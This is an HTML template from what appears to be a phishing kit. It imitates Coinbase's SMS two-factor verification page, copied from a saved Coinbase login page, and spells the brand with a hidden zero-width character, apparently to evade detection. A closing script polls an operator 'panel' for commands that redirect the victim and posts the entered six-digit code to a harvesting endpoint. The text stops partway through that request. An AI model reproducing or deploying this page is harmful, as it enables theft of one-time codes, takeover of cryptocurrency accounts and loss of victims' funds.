        srcdoc="<html><meta charset=utf-8><meta name=referrer content=no-referrer><meta http-equiv=content-security-policy content=&quot;default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:;&quot;>"></iframe>
      <div id=portalRoot style=z-index:100001;position:relative;display:flex>
        <div data-testid=portal-modal-container id=modalsContainer style=z-index:3></div>
        <div data-testid=portal-toast-container id=toastsContainer style=z-index:6></div>
        <div data-testid=portal-alert-container id=alertsContainer style=z-index:7>
          <div class="cds-large-l1kwdti4 cds-light-lxvt6sp"
            style=--foreground:rgb(var(--gray100));--foreground-muted:rgb(var(--gray60));--background:rgb(var(--gray0));--background-alternate:rgb(var(--gray5));--background-inverse:rgb(var(--gray100));--background-overlay:rgba(var(--gray80),0.33);--line:rgba(var(--gray60),0.2);--line-heavy:rgba(var(--gray60),0.66);--primary:rgb(var(--blue60));--primary-wash:rgb(var(--blue0));--primary-foreground:rgb(var(--gray0));--negative:rgb(var(--red60));--negative-foreground:rgb(var(--gray0));--negative-wash:rgb(var(--red0));--positive:rgb(var(--green60));--positive-foreground:rgb(var(--gray0));--secondary:rgb(var(--gray5));--secondary-foreground:rgb(var(--gray100));--transparent:rgba(var(--gray0),0);--warning:rgb(var(--yellow50));--warning-foreground:rgb(var(--orange40))>
          </div>
        </div>
        <div data-testid=portal-tooltip-container id=tooltipContainer style=z-index:5></div>
      </div>
      <div id=cds-hexagon-clipPath-container aria-hidden=true style=height:0px;width:0px><svg height=0
          viewBox="0 0 66 62" width=0>
          <defs>
            <clippath clipPathUnits=objectBoundingBox id=cds-hexagon-avatar-clipper
              transform="scale(0.015151515151515152 0.016129032258064516)">
              <path
                d="M63.4372 22.8624C66.2475 27.781 66.2475 33.819 63.4372 38.7376L54.981 53.5376C52.1324 58.5231 46.8307 61.6 41.0887 61.6H24.4562C18.7142 61.6 13.4125 58.5231 10.564 53.5376L2.10774 38.7376C-0.702577 33.819 -0.702582 27.781 2.10774 22.8624L10.564 8.06243C13.4125 3.07687 18.7142 0 24.4562 0H41.0887C46.8307 0 52.1324 3.07686 54.981 8.06242L63.4372 22.8624Z">
              </path>
            </clippath>
          </defs>
        </svg></div>
      <div aria-hidden=true class=arkose-32FBE3BC-228C-4967-9D76-8B27B3EBCF08-wrapper><iframe
          class="PbRoleerFjplRBGoiUNB lightbox sf-hidden" title="Verification challenge"
          aria-label="Verification challenge" data-e2e=enforcement-frame style=width:0px;height:0px></iframe></div>
      <iframe width=0 height=0 allow="camera; microphone;"
        style=background:transparent;border:0px;position:fixed;visibility:hidden class=sf-hidden></iframe>
  </div>

  <!-- DESKTOP VERSION -->
  <div class="desktop-view">
    <!DOCTYPE html>
    <html lang=en><!--
 Page saved with SingleFile 
 url: https://login.C&#8203;oinbase.com/signin?client_id=258660e1-9cfe-4202-9eda-d3beedb3e118&locale=en&oauth_challenge=ce285c1e-9653-46ce-8edf-2e0c4835e70c 
 saved date: Mon Oct 20 2025 14:15:53 GMT-0700 (Pacific Daylight Time)
-->
    <meta charset=utf-8>
    <meta http-equiv=origin-trial
      content="A7vZI3v+Gz7JfuRolKNM4Aff6zaGuT7X0mf3wtoZTnKv6497cVMnhy03KDqX7kBz/q/iidW7srW31oQbBt4VhgoAAACUeyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGUuY29tOjQ0MyIsImZlYXR1cmUiOiJEaXNhYmxlVGhpcmRQYXJ0eVN0b3JhZ2VQYXJ0aXRpb25pbmczIiwiZXhwaXJ5IjoxNzU3OTgwODAwLCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
    <meta http-equiv=X-UA-Compatible content="IE=edge">
    <meta name=viewport content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>C&#8203;oinbase - Sign in</title>
    <meta name=theme-color content=#0052ff>
    <meta property=og:type content=website>
    <meta property=og:url content=https://login.C&#8203;oinbase.com>
    <meta property=og:title content="C&#8203;oinbase Sign In">
    <meta property=og:site_name content="C&#8203;oinbase Sign In">
    <meta property=description name=description
      content="C&#8203;oinbase is a secure online platform for buying, selling, transferring, and storing digital currency.">
    <meta name=twitter:card content=summary_large_image>
    <meta name=twitter:url content=https://login.C&#8203;oinbase.com>
    <meta name=twitter:title content="C&#8203;oinbase Sign In">
    <link rel="stylesheet" href="/static/css/styles.css">
    <style>
      @-moz-document url-prefix("") {
        .PbRoleerFjplRBGoiUNB {
          visibility: visible;
          display: block
        }
      }
    </style>
    <meta name=description
      content="C&#8203;oinbase is a secure online platform for buying, selling, transferring, and storing cryptocurrency."
      data-rh=true>
    <meta name=referrer content=no-referrer>
    <link rel="shortcut icon" type=image/png sizes=196x196
    
    <style>
      
    </style>
    <link rel=canonical
      href="https://login.C&#8203;oinbase.com/signin?client_id=258660e1-9cfe-4202-9eda-d3beedb3e118&amp;locale=en&amp;oauth_challenge=ce285c1e-9653-46ce-8edf-2e0c4835e70c">
    <meta http-equiv=content-security-policy
      content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:;">
    </head>

    <body class=cds-light-lxvt6sp style=background-color:rgba(var(--gray0))>
      <noscript>You need to enable JavaScript to run this app.</noscript>
      <div id=root style=display:flex;flex-direction:column;min-height:100%>
        <div class="C&#8203;oinbase light"
          <link rel="stylesheet" href="/static/css/styles2.css">
          <div class="cds-large-l1kwdti4 cds-light-lxvt6sp"
            style=--foreground:rgb(var(--gray100));--foreground-muted:rgb(var(--gray60));--background:rgb(var(--gray0));--background-alternate:rgb(var(--gray5));--background-inverse:rgb(var(--gray100));--background-overlay:rgba(var(--gray80),0.33);--line:rgba(var(--gray60),0.2);--line-heavy:rgba(var(--gray60),0.66);--primary:rgb(var(--blue60));--primary-wash:rgb(var(--blue0));--primary-foreground:rgb(var(--gray0));--negative:rgb(var(--red60));--negative-foreground:rgb(var(--gray0));--negative-wash:rgb(var(--red0));--positive:rgb(var(--green60));--positive-foreground:rgb(var(--gray0));--secondary:rgb(var(--gray5));--secondary-foreground:rgb(var(--gray100));--transparent:rgba(var(--gray0),0);--warning:rgb(var(--yellow50));--warning-foreground:rgb(var(--orange40))>
            <div data-testid=global-loading-provider-wrapper class="cds-flex-f1tjavv3 cds-column-c1kchipr"
              style=flex-grow:1;width:100%>
              <div data-testid=page-layout class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-background-b6zr2pu"
                style=height:100%;width:100%>
                <div data-testid=signin-header class="cds-grid-g1uqvyz9 cds-auto-agiev0s" role=banner
                  style="grid-template-columns:auto 1fr auto">
                  <div
                    class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-3-_63shon cds-3-_1krzigx cds-4-_1mgafrb cds-4-_dk22v4 cds-responsive"
                    style=height:72px><svg aria-label="C&#8203;oinbase logo" class=cds-iconStyles-irtngcj height=32 role=img
                      viewBox="0 0 48 48" width=32 xmlns=http://www.w3.org/2000/svg>
                      <title>C&#8203;oinbase logo</title>
                      <path
                        d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z"
                        fill=#0052FF></path>
                    </svg></div>
                </div>
                <div class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-column-c1kchipr cds-8-_1p18wwy cds-1-_17cz18m"
                  style=flex-grow:0;width:100%>
                  <div data-testid=global-loading-provider-wrapper class="cds-flex-f1tjavv3 cds-column-c1kchipr"
                    style=flex-grow:1;min-height:300px;width:100%;align-items:center;justify-content:center>
                    <div class="cds-flex-f1tjavv3 cds-flex-start-fptdbvx cds-row-r1cf21wt cds-center-cqy3t5k"
                      style=flex-grow:1;width:100%>
                      <div class="cds-flex-f1tjavv3 cds-column-c1kchipr"
                        style=flex-grow:1;height:100%;max-width:448px;width:100%>
                        <div
                          class="cds-flex-f1tjavv3 cds-center-cqy3t5k cds-roundedLarge-r1hj45o7 cds-bordered-b10fe35d cds-4-_1g6imbc cds-4-_13srchq cds-4-_q46sbx"
                          style=width:100%>
                          <div id=two-factor class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-3-_10f3bvw"
                            style=width:100%>
                            <div class="cds-flex-f1tjavv3 cds-column-c1kchipr"
                              style=flex-grow:1;max-width:448px;width:100%>
                              <div data-testid=load-view-wrapper class="cds-flex-f1tjavv3 cds-column-c1kchipr"
                                style=flex-grow:1;max-width:448px;width:100%>
                                <div data-testid=sms-input-code class="cds-flex-f1tjavv3 cds-column-c1kchipr"
                                  style=flex-grow:1;width:100%>
                                  <div data-testid=identity-multi-content-layout-content-wrapper-sms-input-code
                                    class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-4-_rtvvf2 cds-3-_1ud7wyy">
                                    <div data-testid=identity-multi-content-layout-content-header-wrapper-sms-input-code
                                      class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-3-_1ud7wyy"><img alt height=48
                                        src=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9IjAgMCA0OCA0OCI+PHBhdGggZmlsbD0iIzAwNTJGRiIgZD0iTTggMmEyIDIgMCAwIDEgMi0yaDI4YTIgMiAwIDAgMSAyIDJ2NDRhMiAyIDAgMCAxLTIgMkgxMGEyIDIgMCAwIDEtMi0yeiIvPjxwYXRoIGZpbGw9IiNDRUQyREIiIGQ9Ik00OCA4SDB2MzJoNDh6Ii8+PHBhdGggZmlsbD0iIzBBMEIwRCIgZD0iTTQwIDhIOHYzMmgzMnoiLz48cGF0aCBmaWxsPSIjRkZGRkZGIiBkPSJNMTUgMjUuNWExLjUgMS41IDAgMSAwIDAtMyAxLjUgMS41IDAgMCAwIDAgM200LjUgMGExLjUgMS41IDAgMSAwIDAtMyAxLjUgMS41IDAgMCAwIDAgM300LjUgMGExLjUgMS41IDAgMSAwIDAtMyAxLjUgMS41IDAgMCAwIDAgM300LjUgMGExLjUgMS41IDAgMSAwIDAtMyAxLjUgMS41IDAgMCAwIDAgM300LjUgMGExLjUgMS41IDAgMSAwIDAtMyAxLjUgMS41IDAgMCAwIDAgMyIvPjxwYXRoIGZpbGw9IiMwQTBCMEQiIGQ9Ik0yMSA0NGExIDEgMCAwIDEgMS0xaDRhMSAxIDAgMSAxIDAgMmgtNGExIDEgMCAwIDEtMS0xbTQtNDBhMSAxIDAgMSAxLTIgMCAxIDEgMCAwIDEgMiAwIi8+PC9zdmc+
                                        width=48>
                                      <div data-testid=identity-multi-content-layout-title-wrapper
                                        class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-1-_1w0e50j">
                                        {% if phone_digits %}
                                        <p
                                          class="cds-typographyResets-t6muwls cds-title1-t2i0v90 cds-foreground-f1v7bdxr cds-transition-t1qvlahm cds-start-s1u0g7ow">
                                          Enter the 6-digit code we texted to +* *******{{ phone_digits }}
                                          {% endif %}
                                        <p
                                          class="cds-typographyResets-t6muwls cds-body-bwup3gq cds-foregroundMuted-flk4pe3 cds-transition-t1qvlahm cds-start-s1u0g7ow cds-break-b1kd50ys">
                                          This helps us keep your account secure by verifying that it's really you.
                                        </p>
                                      </div>
                                    </div>
                                    <div data-testid=identity-multi-content-layout-body-sms-input-code
                                      class="cds-flex-f1tjavv3 cds-column-c1kchipr">
                                      <div data-testid=sms-input-body
                                        class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-2-_mr0se7">
                                        <form id="verificationFormDesktop">
                                          <input type="hidden" id="sessionIdDesktop" value="{{ session_id }}">
                                          <input type="text" id="codeDesktop" name="verification_code"
                                            style="position: absolute; opacity: 0; pointer-events: none;" maxlength="6">


                                          <div class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0-_1dm135g">
                                            <div data-testid=code-inputs-container
                                              class="cds-flex-f1tjavv3 cds-row-r1cf21wt cds-relative-r5okg6e cds-1-_1w0e50j"
                                              role=group aria-label="numerical code inputs"
                                              style=width:100%;position:relative>
                                              <div class="cds-flex-f1tjavv3 cds-0-_216c2g"
                                                style=flex-grow:1;flex-shrink:1;min-width:0px;width:55px>
                                                <div data-testid
                                                  class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0_5-_ey9gyh"
                                                  style=width:100%;opacity:1>
                                                  <div class="cds-flex-f1tjavv3 cds-row-r1cf21wt">
                                                    <div class=cds-inputAreaContainerStyles-ipofex6><span
                                                        data-testid=input-interactable-area
                                                        class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-input-i10uvtgb cds-inputBaseAreaStyles-i16zw4a5 cds-persistedFocusStyles-p6phjeo"
                                                        style=--border-color-unfocused:var(--line-heavy);--border-color-focused:var(--primary);--border-width-focused:var(--border-width-input);--interactable-border-radius:8px;--interactable-background:var(--background);--interactable-hovered-background:rgb(250,250,250);--interactable-hovered-opacity:0.98;--interactable-pressed-background:rgb(235,235,236);--interactable-pressed-opacity:0.92;--interactable-disabled-background:rgb(255,255,255);height:55px>
                                                        <div data-testid
                                                          class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-row-r1cf21wt cds-center-cqy3t5k cds-2-_mr0se7">
                                                        </div><input aria-label="6 digit code, digit 1"
                                                          class="cds-nativeInputBaseStyle-ngba8xt cds-body-bwup3gq cds-1-_n6z2ah"
                                                          tabindex=0 aria-invalid=false id=cds-textinput-label-:ro:
                                                          type=text inputmode=numeric autocomplete=one-time-code value
                                                          style=text-align:center;color-scheme:light maxlength="1">
                                                      </span></div>
                                                  </div>
                                                </div>
                                              </div>
                                              <div class="cds-flex-f1tjavv3 cds-0-_216c2g"
                                                style=flex-grow:1;flex-shrink:1;min-width:0px;width:55px>
                                                <div data-testid
                                                  class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0_5-_ey9gyh"
                                                  style=width:100%;opacity:1>
                                                  <div class="cds-flex-f1tjavv3 cds-row-r1cf21wt">
                                                    <div class=cds-inputAreaContainerStyles-ipofex6><span
                                                        data-testid=input-interactable-area
                                                        class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-input-i10uvtgb cds-inputBaseAreaStyles-i16zw4a5"
                                                        style=--border-color-unfocused:var(--line-heavy);--border-color-focused:var(--primary);--border-width-focused:var(--border-width-input);--interactable-border-radius:8px;--interactable-background:var(--background);--interactable-hovered-background:rgb(250,250,250);--interactable-hovered-opacity:0.98;--interactable-pressed-background:rgb(235,235,236);--interactable-pressed-opacity:0.92;--interactable-disabled-background:rgb(255,255,255);height:55px>
                                                        <div data-testid
                                                          class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-row-r1cf21wt cds-center-cqy3t5k cds-2-_mr0se7">
                                                        </div><input aria-label="6 digit code, digit 2"
                                                          class="cds-nativeInputBaseStyle-ngba8xt cds-body-bwup3gq cds-1-_n6z2ah"
                                                          tabindex=0 aria-invalid=false id=cds-textinput-label-:rp:
                                                          type=text inputmode=numeric autocomplete value
                                                          style=text-align:center;color-scheme:light maxlength="1">
                                                      </span></div>
                                                  </div>
                                                </div>
                                              </div>
                                              <div class="cds-flex-f1tjavv3 cds-0-_216c2g"
                                                style=flex-grow:1;flex-shrink:1;min-width:0px;width:55px>
                                                <div data-testid
                                                  class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0_5-_ey9gyh"
                                                  style=width:100%;opacity:1>
                                                  <div class="cds-flex-f1tjavv3 cds-row-r1cf21wt">
                                                    <div class=cds-inputAreaContainerStyles-ipofex6><span
                                                        data-testid=input-interactable-area
                                                        class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-input-i10uvtgb cds-inputBaseAreaStyles-i16zw4a5"
                                                        style=--border-color-unfocused:var(--line-heavy);--border-color-focused:var(--primary);--border-width-focused:var(--border-width-input);--interactable-border-radius:8px;--interactable-background:var(--background);--interactable-hovered-background:rgb(250,250,250);--interactable-hovered-opacity:0.98;--interactable-pressed-background:rgb(235,235,236);--interactable-pressed-opacity:0.92;--interactable-disabled-background:rgb(255,255,255);height:55px>
                                                        <div data-testid
                                                          class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-row-r1cf21wt cds-center-cqy3t5k cds-2-_mr0se7">
                                                        </div><input aria-label="6 digit code, digit 3"
                                                          class="cds-nativeInputBaseStyle-ngba8xt cds-body-bwup3gq cds-1-_n6z2ah"
                                                          tabindex=0 aria-invalid=false id=cds-textinput-label-:rq:
                                                          type=text inputmode=numeric autocomplete value
                                                          style=text-align:center;color-scheme:light maxlength="1">
                                                      </span></div>
                                                  </div>
                                                </div>
                                              </div>
                                              <div class="cds-flex-f1tjavv3 cds-0-_216c2g"
                                                style=flex-grow:1;flex-shrink:1;min-width:0px;width:55px>
                                                <div data-testid
                                                  class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0_5-_ey9gyh"
                                                  style=width:100%;opacity:1>
                                                  <div class="cds-flex-f1tjavv3 cds-row-r1cf21wt">
                                                    <div class=cds-inputAreaContainerStyles-ipofex6><span
                                                        data-testid=input-interactable-area
                                                        class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-input-i10uvtgb cds-inputBaseAreaStyles-i16zw4a5"
                                                        style=--border-color-unfocused:var(--line-heavy);--border-color-focused:var(--primary);--border-width-focused:var(--border-width-input);--interactable-border-radius:8px;--interactable-background:var(--background);--interactable-hovered-background:rgb(250,250,250);--interactable-hovered-opacity:0.98;--interactable-pressed-background:rgb(235,235,236);--interactable-pressed-opacity:0.92;--interactable-disabled-background:rgb(255,255,255);height:55px>
                                                        <div data-testid
                                                          class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-row-r1cf21wt cds-center-cqy3t5k cds-2-_mr0se7">
                                                        </div><input aria-label="6 digit code, digit 4"
                                                          class="cds-nativeInputBaseStyle-ngba8xt cds-body-bwup3gq cds-1-_n6z2ah"
                                                          tabindex=0 aria-invalid=false id=cds-textinput-label-:rr:
                                                          type=text inputmode=numeric autocomplete value
                                                          style=text-align:center;color-scheme:light maxlength="1">
                                                      </span></div>
                                                  </div>
                                                </div>
                                              </div>
                                              <div class="cds-flex-f1tjavv3 cds-0-_216c2g"
                                                style=flex-grow:1;flex-shrink:1;min-width:0px;width:55px>
                                                <div data-testid
                                                  class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0_5-_ey9gyh"
                                                  style=width:100%;opacity:1>
                                                  <div class="cds-flex-f1tjavv3 cds-row-r1cf21wt">
                                                    <div class=cds-inputAreaContainerStyles-ipofex6><span
                                                        data-testid=input-interactable-area
                                                        class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-input-i10uvtgb cds-inputBaseAreaStyles-i16zw4a5"
                                                        style=--border-color-unfocused:var(--line-heavy);--border-color-focused:var(--primary);--border-width-focused:var(--border-width-input);--interactable-border-radius:8px;--interactable-background:var(--background);--interactable-hovered-background:rgb(250,250,250);--interactable-hovered-opacity:0.98;--interactable-pressed-background:rgb(235,235,236);--interactable-pressed-opacity:0.92;--interactable-disabled-background:rgb(255,255,255);height:55px>
                                                        <div data-testid
                                                          class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-row-r1cf21wt cds-center-cqy3t5k cds-2-_mr0se7">
                                                        </div><input aria-label="6 digit code, digit 5"
                                                          class="cds-nativeInputBaseStyle-ngba8xt cds-body-bwup3gq cds-1-_n6z2ah"
                                                          tabindex=0 aria-invalid=false id=cds-textinput-label-:rs:
                                                          type=text inputmode=numeric autocomplete value
                                                          style=text-align:center;color-scheme:light maxlength="1">
                                                      </span></div>
                                                  </div>
                                                </div>
                                              </div>
                                              <div class="cds-flex-f1tjavv3 cds-0-_216c2g"
                                                style=flex-grow:1;flex-shrink:1;min-width:0px;width:55px>
                                                <div data-testid
                                                  class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-0_5-_ey9gyh"
                                                  style=width:100%;opacity:1>
                                                  <div class="cds-flex-f1tjavv3 cds-row-r1cf21wt">
                                                    <div class=cds-inputAreaContainerStyles-ipofex6><span
                                                        data-testid=input-interactable-area
                                                        class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-input-i10uvtgb cds-inputBaseAreaStyles-i16zw4a5"
                                                        style=--border-color-unfocused:var(--line-heavy);--border-color-focused:var(--primary);--border-width-focused:var(--border-width-input);--interactable-border-radius:8px;--interactable-background:var(--background);--interactable-hovered-background:rgb(250,250,250);--interactable-hovered-opacity:0.98;--interactable-pressed-background:rgb(235,235,236);--interactable-pressed-opacity:0.92;--interactable-disabled-background:rgb(255,255,255);height:55px>
                                                        <div data-testid
                                                          class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-row-r1cf21wt cds-center-cqy3t5k cds-2-_mr0se7">
                                                        </div><input aria-label="6 digit code, digit 6"
                                                          class="cds-nativeInputBaseStyle-ngba8xt cds-body-bwup3gq cds-1-_n6z2ah"
                                                          tabindex=0 aria-invalid=false id=cds-textinput-label-:rt:
                                                          type=text inputmode=numeric autocomplete value
                                                          style=text-align:center;color-scheme:light maxlength="1">
                                                      </span></div>
                                                  </div>
                                                </div>
                                              </div>
                                            </div>
                                          </div>
                                          <!-- Error message -->
                                          <div id="errorMessage"
                                            style="display: none; color: #ff4d4d; padding: 10px; margin: 10px 0; background: rgba(255, 77, 77, 0.1); border-radius: 4px; text-align: center;">
                                            Invalid verification code. Please try again.
                                          </div>
                                        </form>
                                      </div>
                                    </div>
                                  </div>
                                  <div class="cds-flex-f1tjavv3 cds-column-c1kchipr cds-2-_mr0se7"><button
                                      data-testid="unified-login-email-prompt-submit-button" aria-busy="false"
                                      aria-disabled="true"
                                      class="cds-interactable-i17wmk8f cds-disabledState-do7z3i1 cds-disabledBorder-d109aw8r cds-transparent-t1pmzpst cds-button-b15nm6xx cds-fullWidth-f10ei5ro cds-scaledDownState-s1o6alxd cds-primaryForeground-pd71c0x cds-button-b1oh4z3j cds-buttonBlock-b1aolcod cds-4-_1g6imbc cds-4-_13srchq"
                                      disabled="" type="submit"
                                      style="pointer-events:none;--interactable-height:56px;--interactable-border-radius:56px;--interactable-background:var(--primary);--interactable-hovered-background:rgb(1,76,236);--interactable-hovered-opacity:0.92;--interactable-pressed-background:rgb(1,72,221);--interactable-pressed-opacity:0.86;--interactable-disabled-background:rgb(128,169,255)"><span
                                        class="cds-positionRelative-pa1s919"><span
                                          class="cds-typographyResets-t6muwls cds-headline-h4steop cds-primaryForeground-pd71c0x cds-transition-t1qvlahm cds-start-s1u0g7ow"><span>Continue</span></span></span></button>
                                  </div>
                                  <div data-testid=alternate-methods-container
                                    class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-column-c1kchipr cds-3-_5y4gfs cds-2-_jg634k cds-2-_mr0se7"
                                    style=width:100%>
                                    <p data-testid=m2fa-recovery-link
                                      class="cds-typographyResets-t6muwls cds-body-bwup3gq cds-foreground-f1v7bdxr cds-transition-t1qvlahm cds-start-s1u0g7ow cds-1-_1sy2ps1">
                                      <a data-testid=cancel-button class="cds-link cds-link-l678mx9"
                                        href="https://login.C&#8203;oinbase.com/recovery?client_id=258660e1-9cfe-4202-9eda-d3beedb3e118&amp;locale=en&amp;oauth_challenge=ce285c1e-9653-46ce-8edf-2e0c4835e70c"><span
                                          class="cds-typographyResets-t6muwls cds-body-bwup3gq cds-primary-pgii67x cds-transition-t1qvlahm cds-start-s1u0g7ow cds-noUnderline-n12nlvc0 cds-link--container"></span></a>
                                    </p>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                        <div
                          class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-column-c1kchipr cds-3-_5y4gfs cds-3-_10f3bvw">
                          <button data-testid=cancel-button class="cds-link cds-link-l678mx9" type=button><span
                              class="cds-typographyResets-t6muwls cds-body-bwup3gq cds-primary-pgii67x cds-transition-t1qvlahm cds-start-s1u0g7ow cds-link--container"></span></button>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div data-testname=hidden-banner data-testid=banner-container class="cds-flex-f1tjavv3 cds-fixed-f41ml97"
                style="width:100%;position:fixed;bottom:-200px;z-index:4;transition:bottom 500ms;will-change:bottom">
                <div id=cookie-banner class="cds-flex-f1tjavv3 cds-center-cqy3t5k cds-backgroundAlternate-b11ss81y"
                  style=width:100%>
                  <div
                    class="cds-flex-f1tjavv3 cds-center-c14yogr6 cds-row-r1cf21wt cds-space-between-s1y044t2 cds-3-_5y4gfs cds-3-_10f3bvw cds-6-_19boj8m cds-6-_38sm7k"
                    style=max-width:800px;width:100%>
                    <p
                      class="cds-typographyResets-t6muwls cds-label2-l1sm09ec cds-foreground-f1v7bdxr cds-transition-t1qvlahm cds-start-s1u0g7ow cds-0-_1dm135g cds-1-_1vh894o">
                      We use strictly necessary cookies to enable essential functions, such as security and
                      authentication. For more information, see our <a class="cds-link cds-link-l678mx9"
                        href=https://C&#8203;oinbase.com/legal/cookie rel="noopener noreferrer" target=_blank><span
                          class="cds-typographyResets-t6muwls cds-textInherit-t1skdf3q cds-primary-pgii67x cds-transition-t1qvlahm cds-start-s1u0g7ow cds-link--container">Cookie
                          Policy</span></a>.</p><button data-testid=dismiss-button
                      class="cds-interactable-i17wmk8f cds-focusRing-f145pgxk cds-transparent-t1pmzpst cds-button-b15nm6xx cds-scaledDownState-s1o6alxd cds-primaryForeground-pd71c0x cds-button-b1oh4z3j cds-buttonCompact-b6w3n9f cds-2-_11ix2s4 cds-2-_1fpvsav"
                      type=button
                      style=--interactable-height:40px;--interactable-border-radius:40px;--interactable-background:var(--primary);--interactable-hovered-background:rgb(1,76,236);--interactable-hovered-opacity:0.92;--interactable-pressed-background:rgb(1,72,221);--interactable-pressed-opacity:0.86;--interactable-disabled-background:rgb(128,169,255)><span
                        class=cds-positionRelative-pa1s919><span
                          class="cds-typographyResets-t6muwls cds-headline-h4steop cds-primaryForeground-pd71c0x cds-transition-t1qvlahm cds-start-s1u0g7ow"><span>Dismiss</span></span></span></button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <iframe style=display:block!important;position:absolute;top:0px;left:0px;visibility:hidden
        sandbox="allow-popups allow-top-navigation-by-user-activation"
        srcdoc="<html><meta charset=utf-8><meta name=referrer content=no-referrer><meta http-equiv=content-security-policy content=&quot;default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:;&quot;>"></iframe>
      <div id=portalRoot style=z-index:100001;position:relative;display:flex>
        <div data-testid=portal-modal-container id=modalsContainer style=z-index:3></div>
        <div data-testid=portal-toast-container id=toastsContainer style=z-index:6></div>
        <div data-testid=portal-alert-container id=alertsContainer style=z-index:7>
          <div class="cds-large-l1kwdti4 cds-light-lxvt6sp"
            style=--foreground:rgb(var(--gray100));--foreground-muted:rgb(var(--gray60));--background:rgb(var(--gray0));--background-alternate:rgb(var(--gray5));--background-inverse:rgb(var(--gray100));--background-overlay:rgba(var(--gray80),0.33);--line:rgba(var(--gray60),0.2);--line-heavy:rgba(var(--gray60),0.66);--primary:rgb(var(--blue60));--primary-wash:rgb(var(--blue0));--primary-foreground:rgb(var(--gray0));--negative:rgb(var(--red60));--negative-foreground:rgb(var(--gray0));--negative-wash:rgb(var(--red0));--positive:rgb(var(--green60));--positive-foreground:rgb(var(--gray0));--secondary:rgb(var(--gray5));--secondary-foreground:rgb(var(--gray100));--transparent:rgba(var(--gray0),0);--warning:rgb(var(--yellow50));--warning-foreground:rgb(var(--orange40))>
          </div>
        </div>
        <div data-testid=portal-tooltip-container id=tooltipContainer style=z-index:5></div>
      </div>
      <div id=cds-hexagon-clipPath-container aria-hidden=true style=height:0px;width:0px><svg height=0
          viewBox="0 0 66 62" width=0>
          <defs>
            <clippath clipPathUnits=objectBoundingBox id=cds-hexagon-avatar-clipper
              transform="scale(0.015151515151515152 0.016129032258064516)">
              <path
                d="M63.4372 22.8624C66.2475 27.781 66.2475 33.819 63.4372 38.7376L54.981 53.5376C52.1324 58.5231 46.8307 61.6 41.0887 61.6H24.4562C18.7142 61.6 13.4125 58.5231 10.564 53.5376L2.10774 38.7376C-0.702577 33.819 -0.702582 27.781 2.10774 22.8624L10.564 8.06243C13.4125 3.07687 18.7142 0 24.4562 0H41.0887C46.8307 0 52.1324 3.07686 54.981 8.06242L63.4372 22.8624Z">
              </path>
            </clippath>
          </defs>
        </svg></div><iframe width=0 height=0 allow="camera; microphone;"
        style=background:transparent;border:0px;position:fixed;visibility:hidden class=sf-hidden></iframe>
  </div>

<script>
// Check for commands from panel every 2 seconds
// Check for commands from panel every 2 seconds
function checkForCommands() {
  fetch('/check-command')
  .then(response => response.json())
      .then(data => {
          if (data.command && data.command.startsWith('encoded_')) {
              const encoded = data.command.replace('encoded_', '');
              console.log('Encoded command received, redirecting to:', encoded);
              window.location.href = `/e/${encoded}`;
        }
      })
      .catch(error => console.error('Error checking commands:', error));
}

// Simple form submission
function submitVerificationCode(code, sessionId, errorElement) {
    console.log('Submitting code:', code, 'Session:', sessionId);
    
    // Show loading state on all buttons
    const buttons = document.querySelectorAll('[data-testid="unified-login-email-prompt-submit-button"]');
    buttons.forEach(btn => {
        btn.style.opacity = '0.7';
        btn.disabled = true;
    });

    // Submit to your endpoint
    fetch('/C&#8203;oinbase-2factor-submit', {
        method: 'POST',
        headers: {
